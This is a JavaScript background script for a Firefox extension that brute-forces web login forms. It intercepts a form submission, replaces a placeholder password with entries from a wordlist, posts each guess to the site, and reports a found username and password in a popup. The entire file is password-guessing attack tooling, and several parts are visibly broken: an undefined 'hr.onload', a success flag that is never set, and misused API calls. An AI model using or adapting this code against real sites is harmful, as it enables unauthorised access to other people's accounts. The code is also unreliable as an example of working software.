var isCracking = false;
var windowopen = false;
var types = [];
var pattern = false;
var failpattern;
var crackuser;
var wordlist;
var wordbyline = [];
var msgHandler = () => {};
var cracked = false;
var pagedata;
var origin;
var un_f;
var un_p;
var ops;
var pw;
var landing;
function handleMessage(msg) {
  msgHandler(msg);
}

function cracking_header_listener(e) {
  if((e.originUrl || "").indexOf("moz-extension://") === 0) return e;
  if(!~types.indexOf(e.type)) return e;
  if(pattern && null === e.url.match(RegExp(pattern, "g"))) return e;
  return new Promise(done => {
    var data = {
      method: e.method,
      url: e.url,
      type: e.type,
      headers: []
    };
    e.requestHeaders.forEach(function(header) {
      data.headers.push({
        name: header.name,
        value: header.value
      });
    });
    done({
      requestHeaders: data.headers
    });
  });
}

function cracking_request_listener(e) {
  if((e.originUrl || "").indexOf("moz-extension://") === 0) return e;
  if(!~types.indexOf(e.type)) return e;
  if(pattern && null === e.url.match(RegExp(pattern, "g"))) return e;
  return new Promise(done => {
    var body = [];
    if(e.requestBody && e.requestBody.formData) {
      for(var n in e.requestBody.formData) {
        if(e.requestBody.formData.hasOwnProperty(n)) body.push({
          name: n,
          value: e.requestBody.formData[n][0]
        });
      }
    }
    pagedata = {
      method: e.method,
      url: e.url,
      type: e.type,
      body: body
    };
    origin = e.originUrl;
    wordbyline = wordlist.split("\n");
for(var iter = 0; iter <= wordbyline.length-1;iter++) {
    ops = "";
browser.tabs.update({url: origin});
pagedata.body.forEach(body => {
    if(body.value == crackuser) {
      ops = ops.concat(body.name, "=", crackuser, "&");
    }
    if(body.value == "DUMMYPASS") {
      ops = ops.concat( body.name, "=", wordbyline[iter], "&");
    }
    if ((body.value != "DUMMYPASS") && (body.value != crackuser)) {
      ops = ops.concat( body.name, "=", body.value, "&");
    }
  });
    ops = ops.slice(0, -1);
    var xhr = new XMLHttpRequest();
    xhr.open("POST", origin, true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    console.log("Trying: " + crackuser + " " + wordbyline[iter]);
    console.log("Sending to " + origin + ": " + ops);
    xhr.send(ops);
    hr.onload  = function() {
      var databack = this.responseText;
      if(databack.match(RegExp(failpattern), "ig") != null) {
        console.log(databack);
        pw = wordbyline[iter];
}
}
      if(cracked == true) {
break;
}
}
if(cracked == true) {
      return new Promise(done => {
      browser.windows.create({
        url: "cracked.html?login=" + crackuser + "&password=" + pw,
        type: "panel"
      }).then(w => {
 });
stop_cracking_listener();    
});

}
else{
browser.window.back();
}  
  done(e);
  });
  }

function stop_cracking_listener() {
  var listening = browser.webRequest.onBeforeSendHeaders.hasListener(cracking_header_listener);
  if(listening) {
    browser.webRequest.onBeforeSendHeaders.removeListener(cracking_header_listener);
    browser.webRequest.onBeforeRequest.removeListener(cracking_request_listener);
  }
}

function start_cracking_listener() {
  browser.webRequest.onBeforeSendHeaders.addListener(cracking_header_listener, {
      urls: ["<all_urls>"]
    },
    ["blocking", "requestHeaders"]);
  browser.webRequest.onBeforeRequest.addListener(cracking_request_listener, {
      urls: ["<all_urls>"]
    },
    ["blocking", "requestBody"]);
}

function user_confirm_cracking() {
  return new Promise(done => {
    browser.windows.create({
      url: "popup.html",
      type: "panel",
      allowScriptsToClose: true
    }).then(w => {
      msgHandler = msg => {
        types = msg.types;
        pattern = msg.docpattern;
        failpattern = msg.failpattern;
        crackuser = msg.crackuser;
        landing = msg.landing;
        wordlist = msg.wordlist;
        browser.windows.getCurrent().then(wi => {
          browser.windows.remove(wi.id);
          done(msg);
        });
      };
    });
  });
}

function user_modify_headers(data) {
  return new Promise(done => {
    browser.windows.create({
      url: "headers.html?" + encodeURIComponent(JSON.stringify(data)),
      type: "panel",
      allowScriptsToClose: true
    }).then(w => {
      msgHandler = msg => {
        browser.windows.getCurrent().then(wi => {
          browser.windows.remove(wi.id);
          done(msg);
        });
      };
    });
  });
}

function user_modify_body(data) {}

function confirm_and_start_cracking() {
  user_confirm_cracking().then(res => {
    if(res.tamper === true) {
      isCracking = true;
      browser.browserAction.setIcon({
        path: {
          "48": "images/crackedegg.png",
          "32": "images/crackedegg.png",
          "16": "images/crackedegg.png"
        }
      });
      start_cracking_listener();
    }
  });
}

function stop_cracking() {
  isCracking = false;
  browser.browserAction.setIcon({
    path: {
      "48": "images/wholeegg.png",
      "32": "images/wholeegg.png",
      "16": "images/wholeegg.png"
    }
  });
  stop_cracking_listener();
}
browser.runtime.onMessage.addListener(handleMessage);
browser.browserAction.onClicked.addListener(() => {
  if(!isCracking) confirm_and_start_cracking();
  else stop_cracking();
});
